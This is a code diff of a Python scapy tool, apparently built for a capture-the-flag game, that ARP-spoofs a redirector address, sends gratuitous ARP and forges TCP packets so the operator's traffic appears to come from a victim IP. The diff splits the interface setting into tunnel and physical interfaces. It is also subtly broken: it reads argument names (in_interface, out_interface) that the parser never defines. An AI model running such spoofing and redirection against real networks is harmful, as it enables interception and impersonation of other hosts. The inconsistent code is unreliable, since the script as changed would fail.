@@ -8,7 +8,8 @@ import time
 
 def get_argument():
   parser = argparse.ArgumentParser()
-  parser.add_argument('-i', '--interface', help = 'The interface that redirector listen on it')
+  parser.add_argument('-i', '--tun-interface', help = 'The tunnel interface')
+  parser.add_argument('-o', '--real-interface', help = 'The physical interface')
   parser.add_argument('-H', '--hide-ip', help = 'Our IP address that will hide behind Victim address')
   parser.add_argument('-v', '--victim-ip', help = 'Destination victim IP address that traffic route to that')
   parser.add_argument('-r', '--redirector-ip', help = 'Intermediary IP address for redirection usage')
@@ -16,8 +17,8 @@ def get_argument():
   parser.add_argument('-m', '--masquerade-ip', help = 'Masquerade IP address in the CTF game')
   parser.add_argument('-p', '--ports', help = 'List comma seperated local ports that will hide by redirect traffic to victim (e.g: 10001, 20001)')
   args = parser.parse_args()
-  if not args.interface:
-    parser.error("[-] Please specify an interface, use --help for more info.")
+  if not args.tun_interface:
+    parser.error("[-] Please specify tunnel interface, use --help for more info.")
   elif not args.hide_ip:
     parser.error("[-] Please specify hide IP address, use --help for more info.")
   elif not args.victim_ip:
@@ -30,8 +31,9 @@ def get_argument():
     parser.error("[-] Please specify list of ports, use --help for more info.")
   elif not args.redirector_ethernet:
     parser.error("[-] Please specify redirector MAC address, use --help for more info.")
+  elif not args.real_interface:
+    parser.error("[-] Please specify physical interface, use --help for more info.")
   return args
-
 
 
 def signal_handler(sig, frame):
@@ -41,7 +43,7 @@ def signal_handler(sig, frame):
 def gratuitous_arp():
   g_arp_reflector = Ether(dst=BROADCAST_MAC) / ARP(op=1, psrc=REDIRECTOR_IP, hwsrc=REDIRECTOR_ETHERNET, hwdst=BROADCAST_MAC, pdst=REDIRECTOR_IP)
   while True:
-    sendp(g_arp_reflector, iface=LOCAL_INTERFACE, verbose=0)
+    sendp(g_arp_reflector, iface=REAL_INTERFACE, verbose=0)
     time.sleep(1)
 
 def arp_spoof(arp_request):
@@ -54,7 +56,7 @@ def arp_spoof(arp_request):
     arp_reply[ARP].hwdst = arp_request[ARP].hwsrc
     arp_reply[ARP].psrc = REDIRECTOR_IP
     arp_reply[ARP].pdst = arp_request[ARP].psrc
-    sendp(arp_reply, iface=LOCAL_INTERFACE, verbose=0)
+    sendp(arp_reply, iface=REAL_INTERFACE, verbose=0)
 
 
 def redirect_tcp(rec_packet):
@@ -83,7 +85,7 @@ def redirect_tcp(rec_packet):
       packet[TCP].options = rec_packet[TCP].options
       del packet[IP].chksum
       del packet[TCP].chksum
-      sendp(packet, iface=LOCAL_INTERFACE, verbose=0)
+      sendp(packet, iface=REAL_INTERFACE, verbose=0)
     except:
       print("!")
 
@@ -113,24 +115,25 @@ def sendback_tcp(response):
       packet[TCP].options = response[TCP].options
       del packet[IP].chksum
       del packet[TCP].chksum
-      sendp(packet, iface=LOCAL_INTERFACE, verbose=0)
+      sendp(packet, iface=TUN_INTERFACE, verbose=0)
     except:
       print("!")
 
 def redirect_sniff_tcp():
-  sniff(iface=LOCAL_INTERFACE, filter="tcp and dst host " + HIDE_IP, prn=redirect_tcp)
+  sniff(iface=TUN_INTERFACE, filter="tcp and dst host " + HIDE_IP, prn=redirect_tcp)
 
 def sendback_sniff_tcp():
-  sniff(iface=LOCAL_INTERFACE, filter="tcp and dst host " + REDIRECTOR_IP, prn=sendback_tcp)
+  sniff(iface=REAL_INTERFACE, filter="tcp and dst host " + REDIRECTOR_IP, prn=sendback_tcp)
 
 def arp_sniff():
-  sniff(iface=LOCAL_INTERFACE, filter="arp", prn=arp_spoof)
+  sniff(iface=REAL_INTERFACE, filter="arp", prn=arp_spoof)
 
 
 if __name__ == "__main__":
   signal.signal(signal.SIGINT, signal_handler)
   args = get_argument()
-  LOCAL_INTERFACE      = args.interface
+  TUN_INTERFACE         = args.in_interface
+  REAL_INTERFACE        = args.out_interface
   HIDE_IP              = args.hide_ip
   VICTIM_IP            = args.victim_ip
   REDIRECTOR_IP        = args.redirector_ip
@@ -138,8 +141,6 @@ if __name__ == "__main__":
   MASQUERADE_IP        = args.masquerade_ip
   PORTS                = list(args.ports.split(","))
   BROADCAST_MAC        = 'ff:ff:ff:ff:ff:ff'
-
-  print (LOCAL_INTERFACE, HIDE_IP, VICTIM_IP, REDIRECTOR_IP, PORTS)
 
   redirect_thread_tcp = threading.Thread(target=redirect_sniff_tcp, args=())
   sendback_thread_tcp = threading.Thread(target=sendback_sniff_tcp, args=())
